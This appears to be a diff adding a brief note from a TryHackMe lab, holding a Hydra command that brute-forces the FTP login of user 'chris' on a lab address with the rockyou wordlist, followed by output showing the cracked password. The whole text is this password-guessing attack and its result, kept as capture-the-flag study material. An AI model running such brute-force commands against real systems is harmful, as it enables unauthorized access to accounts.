@@ -1,0 +1,5 @@
+hydra -l chris -P ~/Tryhackme/List_For_Enumeration/wordlists/rockyou.txt 10.10.113.179 ftp -s 21 -V -f
+
+
+[21][ftp] host: 10.10.113.179   login: chris   password: crystal
+
